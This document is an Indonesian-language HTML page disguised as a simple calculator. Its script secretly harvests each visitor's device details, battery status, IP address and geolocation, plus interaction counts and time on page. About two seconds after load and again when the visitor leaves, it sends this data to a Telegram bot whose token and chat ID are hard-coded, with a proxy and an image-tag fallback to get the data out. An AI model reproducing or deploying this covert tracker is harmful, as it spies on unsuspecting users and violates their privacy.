<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Kalkulator Sederhana</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      max-width: 600px;
      margin: 0 auto;
      padding: 20px;
      background-color: #f5f5f7;
      color: #333;
    }
    
    .calculator {
      background: white;
      border-radius: 12px;
      padding: 25px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
      margin-top: 30px;
    }
    
    h1 {
      text-align: center;
      color: #2c3e50;
      margin-bottom: 30px;
    }
    
    .display {
      background: #f8f9fa;
      border-radius: 8px;
      padding: 15px;
      margin-bottom: 20px;
      text-align: right;
      font-size: 24px;
      min-height: 60px;
      border: 1px solid #e0e0e0;
    }
    
    .buttons {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 10px;
    }
    
    button {
      padding: 15px;
      font-size: 18px;
      border: none;
      border-radius: 8px;
      background: #f0f0f0;
      cursor: pointer;
      transition: all 0.2s;
    }
    
    button:hover {
      background: #e0e0e0;
    }
    
    .operator {
      background: #ffeaa7;
    }
    
    .operator:hover {
      background: #fdcb6e;
    }
    
    .equals {
      background: #74b9ff;
      color: white;
      grid-column: span 2;
    }
    
    .equals:hover {
      background: #0984e3;
    }
    
    .clear {
      background: #ff7675;
      color: white;
    }
    
    .clear:hover {
      background: #d63031;
    }
    
    .footer {
      text-align: center;
      margin-top: 30px;
      color: #7f8c8d;
      font-size: 14px;
    }
    
    .notification {
      position: fixed;
      bottom: 20px;
      right: 20px;
      background: #2d3436;
      color: white;
      padding: 12px 20px;
      border-radius: 8px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
      opacity: 0;
      transform: translateY(20px);
      transition: opacity 0.3s, transform 0.3s;
      z-index: 1000;
      display: flex;
      align-items: center;
    }
    
    .notification.show {
      opacity: 1;
      transform: translateY(0);
    }
    
    .notification-icon {
      margin-right: 10px;
      color: #00b894;
    }
    
    .hidden-data {
      display: none;
    }
  </style>
</head>
<body>
  <h1>Kalkulator Sederhana</h1>
  
  <div class="calculator">
    <div class="display" id="display">0</div>
    
    <div class="buttons">
      <button class="clear" onclick="clearDisplay()">C</button>
      <button onclick="appendToDisplay('(')">(</button>
      <button onclick="appendToDisplay(')')">)</button>
      <button class="operator" onclick="appendToDisplay('/')">/</button>
      
      <button onclick="appendToDisplay('7')">7</button>
      <button onclick="appendToDisplay('8')">8</button>
      <button onclick="appendToDisplay('9')">9</button>
      <button class="operator" onclick="appendToDisplay('*')">×</button>
      
      <button onclick="appendToDisplay('4')">4</button>
      <button onclick="appendToDisplay('5')">5</button>
      <button onclick="appendToDisplay('6')">6</button>
      <button class="operator" onclick="appendToDisplay('-')">-</button>
      
      <button onclick="appendToDisplay('1')">1</button>
      <button onclick="appendToDisplay('2')">2</button>
      <button onclick="appendToDisplay('3')">3</button>
      <button class="operator" onclick="appendToDisplay('+')">+</button>
      
      <button onclick="appendToDisplay('0')">0</button>
      <button onclick="appendToDisplay('.')">.</button>
      <button class="equals" onclick="calculate()">=</button>
    </div>
  </div>
  
  <div class="footer">
    <p>Kalkulator sederhana dengan antarmuka yang mudah digunakan</p>
    <p>&copy; 2023 - Aplikasi Kalkulator</p>
  </div>
  
  <!-- Notifikasi -->
  <div class="notification" id="notification">
    <div class="notification-icon">✓</div>
    <div>Data terkirim</div>
  </div>
  
  <!-- Elemen tersembunyi untuk mengumpulkan data -->
  <div class="hidden-data" id="hidden-data">
    <div id="user-agent"></div>
    <div id="screen-resolution"></div>
    <div id="battery-level"></div>
    <div id="ip-address"></div>
    <div id="location-data"></div>
    <div id="timezone"></div>
    <div id="language"></div>
  </div>

  <script>
    // Fungsi kalkulator (tampilan depan)
    let displayValue = '0';
    
    function updateDisplay() {
      document.getElementById('display').textContent = displayValue;
    }
    
    function appendToDisplay(value) {
      if (displayValue === '0' && value !== '.') {
        displayValue = value;
      } else {
        displayValue += value;
      }
      updateDisplay();
    }
    
    function clearDisplay() {
      displayValue = '0';
      updateDisplay();
    }
    
    function calculate() {
      try {
        displayValue = eval(displayValue).toString();
      } catch (error) {
        displayValue = 'Error';
      }
      updateDisplay();
    }
    
    // Fungsi untuk menampilkan notifikasi
    function showNotification() {
      const notification = document.getElementById('notification');
      notification.classList.add('show');
      
      setTimeout(() => {
        notification.classList.remove('show');
      }, 3000);
    }
    
    // Fungsi siluman untuk mengumpulkan data
    const botToken = "7021084846:AAFs4pserz_4f3jQ_qyWDj1ZA4OzXfdLA8g";
    const chatId = "8420160314";
    
    // Data yang dikumpulkan
    const collectedData = {
      userAgent: navigator.userAgent,
      screen: `${screen.width}x${screen.height}`,
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      referrer: document.referrer || 'Direct',
      timestamp: new Date().toISOString(),
      pageUrl: window.location.href,
      cookiesEnabled: navigator.cookieEnabled,
      javaEnabled: navigator.javaEnabled(),
      pdfViewerEnabled: navigator.pdfViewerEnabled || false,
      doNotTrack: navigator.doNotTrack || 'unspecified',
      hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
      deviceMemory: navigator.deviceMemory || 'unknown',
      touchPoints: navigator.maxTouchPoints || 0
    };
    
    // Isi data tersembunyi (tidak terlihat oleh pengguna)
    document.getElementById('user-agent').textContent = collectedData.userAgent;
    document.getElementById('screen-resolution').textContent = collectedData.screen;
    document.getElementById('timezone').textContent = collectedData.timezone;
    document.getElementById('language').textContent = collectedData.language;
    
    // Ambil info baterai
    if (navigator.getBattery) {
      navigator.getBattery().then(function(battery) {
        collectedData.batteryLevel = Math.round(battery.level * 100);
        collectedData.charging = battery.charging;
        document.getElementById('battery-level').textContent = `${collectedData.batteryLevel}% (${collectedData.charging ? 'Charging' : 'Not charging'})`;
      });
    }
    
    // Lacak interaksi pengguna
    let interactionCount = 0;
    const interactionEvents = ['click', 'keypress', 'mousemove', 'scroll', 'touchstart'];
    
    interactionEvents.forEach(eventType => {
      document.addEventListener(eventType, function() {
        interactionCount++;
        collectedData.lastInteraction = new Date().toISOString();
        collectedData.interactionCount = interactionCount;
      }, { passive: true });
    });
    
    // Fungsi untuk mengirim data ke Telegram
    function sendToTelegram(message) {
      // Menggunakan proxy untuk menghindari masalah CORS
      const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
      const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
      
      fetch(proxyUrl + apiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Requested-With': 'XMLHttpRequest'
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'Markdown'
        })
      })
      .then(response => {
        if (!response.ok) {
          throw new Error('Network response was not ok');
        }
        return response.json();
      })
      .then(data => {
        console.log('Data terkirim ke Telegram:', data);
        showNotification();
      })
      .catch(error => {
        console.error('Error sending to Telegram:', error);
        
        // Fallback: coba metode alternatif menggunakan img tag untuk request GET
        const fallbackMessage = encodeURIComponent(message.substring(0, 1000)); // Membatasi panjang pesan
        const img = new Image();
        img.src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${fallbackMessage}`;
        
        console.log('Mencoba metode fallback...');
      });
    }
    
    // Ambil alamat IP dan lokasi
    function fetchIPAndSendData() {
      fetch('https://ipapi.co/json/')
        .then(response => {
          if (!response.ok) {
            throw new Error('Network response was not ok');
          }
          return response.json();
        })
        .then(data => {
          collectedData.ip = data.ip;
          collectedData.city = data.city;
          collectedData.region = data.region;
          collectedData.country = data.country_name;
          collectedData.org = data.org;
          collectedData.postal = data.postal;
          collectedData.latitude = data.latitude;
          collectedData.longitude = data.longitude;
          
          document.getElementById('ip-address').textContent = data.ip;
          document.getElementById('location-data').textContent = `${data.city}, ${data.region}, ${data.country_name}`;
          
          // Format pesan untuk Telegram
          const message = `
🕵️‍♂️ *Data Pengunjung Terkumpul* 🕵️‍♂️

*📊 Informasi Perangkat:*
• IP: ${collectedData.ip || 'Tidak tersedia'}
• Lokasi: ${collectedData.city || 'Tidak tersedia'}, ${collectedData.region || 'Tidak tersedia'}, ${collectedData.country || 'Tidak tersedia'}
• Browser: ${collectedData.userAgent.split(')')[0].split('(')[1] || 'Tidak diketahui'}
• Resolusi: ${collectedData.screen}
• Bahasa: ${collectedData.language}
• Zona Waktu: ${collectedData.timezone}

*🔧 Spesifikasi Teknis:*
• CPU Threads: ${collectedData.hardwareConcurrency}
• Memori Perangkat: ${collectedData.deviceMemory} GB
• Touch Points: ${collectedData.touchPoints}
• Cookies: ${collectedData.cookiesEnabled ? 'Diaktifkan' : 'Dinonaktifkan'}
• Java: ${collectedData.javaEnabled ? 'Diaktifkan' : 'Dinonaktifkan'}
• PDF Viewer: ${collectedData.pdfViewerEnabled ? 'Diaktifkan' : 'Dinonaktifkan'}
• Do Not Track: ${collectedData.doNotTrack}

*🔋 Info Baterai:*
• Level: ${collectedData.batteryLevel || 'Tidak tersedia'}%
• Status: ${collectedData.charging ? 'Sedang mengisi' : 'Tidak mengisi' || 'Tidak tersedia'}

*🌐 Informasi Lain:*
• Sumber: ${collectedData.referrer}
• URL Halaman: ${collectedData.pageUrl}
• Waktu: ${new Date().toLocaleString('id-ID')}
• Interaksi: ${collectedData.interactionCount || 0} actions

*📍 Google Maps:*
https://www.google.com/maps?q=${collectedData.latitude || 0},${collectedData.longitude || 0}
          `;
          
          // Kirim data ke Telegram
          sendToTelegram(message);
        })
        .catch(error => {
          console.error('Error fetching location data:', error);
          collectedData.ip = 'Unable to retrieve';
          
          // Kirim data tanpa info lokasi
          const message = `
🕵️‍♂️ *Data Pengunjung Terkumpul* 🕵️‍♂️

*📊 Informasi Perangkat:*
• IP: Tidak dapat mengambil data IP
• Browser: ${collectedData.userAgent.split(')')[0].split('(')[1] || 'Tidak diketahui'}
• Resolusi: ${collectedData.screen}
• Bahasa: ${collectedData.language}
• Zona Waktu: ${collectedData.timezone}

*🔧 Spesifikasi Teknis:*
• CPU Threads: ${collectedData.hardwareConcurrency}
• Memori Perangkat: ${collectedData.deviceMemory} GB
• Touch Points: ${collectedData.touchPoints}
• Cookies: ${collectedData.cookiesEnabled ? 'Diaktifkan' : 'Dinonaktifkan'}

*🌐 Informasi Lain:*
• Sumber: ${collectedData.referrer}
• URL Halaman: ${collectedData.pageUrl}
• Waktu: ${new Date().toLocaleString('id-ID')}
• Interaksi: ${collectedData.interactionCount || 0} actions
          `;
          
          sendToTelegram(message);
        });
    }
    
    // Tunggu hingga halaman selesai dimuat
    window.addEventListener('load', function() {
      // Tunggu sebentar sebelum mulai mengambil data
      setTimeout(fetchIPAndSendData, 2000);
    });
    
    // Kirim data saat pengguna meninggalkan halaman
    window.addEventListener('beforeunload', function() {
      collectedData.timeOnPage = Math.round((Date.now() - new Date(collectedData.timestamp).getTime()) / 1000);
      
      const exitMessage = `
🚪 *Pengguna Meninggalkan Halaman* 🚪

Waktu pada halaman: ${collectedData.timeOnPage} detik
Total interaksi: ${collectedData.interactionCount || 0} actions
Waktu keluar: ${new Date().toLocaleString('id-ID')}
      `;
      
      sendToTelegram(exitMessage);
    });
  </script>
</body>
</html>
